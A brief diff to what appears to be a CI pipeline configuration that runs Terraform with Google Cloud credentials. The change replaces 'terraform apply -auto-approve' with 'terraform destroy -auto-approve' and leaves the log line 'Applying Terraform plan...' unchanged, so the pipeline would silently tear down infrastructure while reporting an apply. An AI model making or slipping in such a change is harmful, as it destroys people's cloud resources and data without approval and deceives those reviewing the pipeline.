@@ -40,4 +40,4 @@ steps:
         export GOOGLE_APPLICATION_CREDENTIALS=/workspace/key.json
 
         echo "Applying Terraform plan..."
-        terraform apply -auto-approve tfplan
+        terraform destroy -auto-approve tfplan
